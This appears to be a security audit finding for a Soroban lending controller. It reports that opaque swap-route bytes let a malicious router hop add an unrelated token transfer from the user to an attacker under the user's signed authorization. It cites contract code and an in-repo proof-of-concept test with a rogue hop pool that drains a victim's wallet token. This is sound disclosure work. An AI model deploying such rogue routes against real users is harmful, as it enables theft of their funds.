### Title
Opaque router payload can smuggle unauthorized `caller`-authorized token transfers under strategy entrypoints - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_collateral`, `multiply`, `swap_debt`, and `repay_debt_with_collateral` authenticate only the top-level `caller`, then pass an opaque `swap: Bytes` route into the configured router; because deeper `caller.require_auth()` calls are attached to that same Soroban authorization tree, a crafted route can cause the user's signature to authorize transfers of unrelated wallet tokens that the lending operation never requested [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
The controller entrypoint authenticates the caller once and enforces ownership/delegation, but treats `swap` as opaque bytes forwarded to `SwapAggregatorClient::execute_strategy` [4](#0-3) [5](#0-4) .  
`swap_tokens` guards only the controller's exact input transfer with `authorize_as_current_contract`, snapshots only `token_in`/`token_out` balances of the controller, and then executes arbitrary router-selected code inside the caller's authorized invocation [6](#0-5) [7](#0-6) .  
The test double shows the analog precisely: a router decodes attacker-controlled route bytes and invokes a route-named hop, while that hop calls `token.transfer(victim, attacker, amount)` on an unrelated wallet token [8](#0-7) [9](#0-8) .  
In recording/simulation mode that unauthorized-looking transfer is recorded as a child of the user's `swap_collateral` root, and if the user signs the returned tree, enforcing mode executes the theft [10](#0-9) [11](#0-10) .

### Impact Explanation
A successful poisoned route steals user funds outside the accounted `token_in`/`token_out` pair, because the controller's balance-delta checks only measure controller-held swap assets and cannot see unrelated token transfers authorized deeper in the tree [12](#0-11) [13](#0-12) .  
The demonstrated impact is direct theft: Alice's unrelated wallet token balance goes to zero while the attacker receives it and the intended ETH collateral is still deposited [13](#0-12) .

### Likelihood Explanation
The reachable path is an unprivileged `swap_collateral(caller, account_id, current, amount, new, swap)` call, and the same opaque-route boundary exists in the other strategy entrypoints that funnel into `swap_tokens` [14](#0-13) [15](#0-14) [16](#0-15) .  
Likelihood is bounded by the need for the victim to sign an auth tree that simulation reveals contains the extra `token.transfer`; wallets that surface only the root action or route bytes as opaque `Bytes` make this realistic, while careful signers can reject the poisoned tree [17](#0-16) [18](#0-17) .

### Recommendation
Do not let user-supplied opaque route bytes introduce arbitrary contract invocations beneath `caller.require_auth`; require the router to execute only a strict allowlisted venue program or signed route manifest whose every hop and required user authorization is explicitly enumerated and displayed to the signer [2](#0-1) [8](#0-7) .  
If arbitrary routes remain supported, separate user authentication from route execution by making router hops operate on controller/router-held funds only, and reject or make impossible any nested `caller.require_auth()` outside the exact expected input-payment contexts [19](#0-18) [20](#0-19) .

### Proof of Concept
The in-repo PoC registers an `UnlistedPoolRouter` whose `execute_strategy` decodes caller-provided `swap_xdr`, invokes `route.hop_pool`, then returns fair output [8](#0-7) .  
The route's `RogueHopPool.swap` is initialized with `(victim, wallet_token, attacker, amount)` and performs `token.transfer(victim, attacker, amount)` when invoked [21](#0-20) .  
Calling `Controller.swap_collateral` in recording mode produces an auth tree whose root is `swap_collateral` and whose child is the unrelated `wallet_token.transfer(alice, attacker, WALLET_BALANCE)`; after that poisoned tree is signed, enforcing mode moves `WALLET_BALANCE` from Alice to the attacker while the strategy still deposits the expected ETH output [10](#0-9) [11](#0-10) .

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-65)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L24-55)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-46)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L56-70)
```rust
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L199-226)
```rust
    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-256)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** common/src/token.rs (L33-51)
```rust
/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
```

**File:** contracts/controller/src/lib.rs (L283-302)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
```

**File:** contracts/controller/src/strategies/multiply.rs (L90-97)
```rust
    let swapped_collateral = swap_tokens_or_passthrough(
        env,
        caller,
        &debt.asset,
        swap_amount_in,
        &collateral.asset,
        swap,
    );
```

**File:** contracts/controller/src/strategies/legs.rs (L246-258)
```rust
    let actual_withdrawn = withdraw_collateral_to_controller(
        env,
        account,
        cache,
        StrategyWithdraw {
            hub_asset: from,
            amount,
            position: &supply_pos,
            action,
        },
    );

    swap_tokens_or_passthrough(env, caller, &from.asset, actual_withdrawn, token_out, swap)
```

**File:** contracts/controller/src/risk/validation.rs (L13-15)
```rust
pub(crate) fn require_authorized_caller(env: &Env, caller: &Address) {
    caller.require_auth();
    require_not_flash_loaning(env);
```
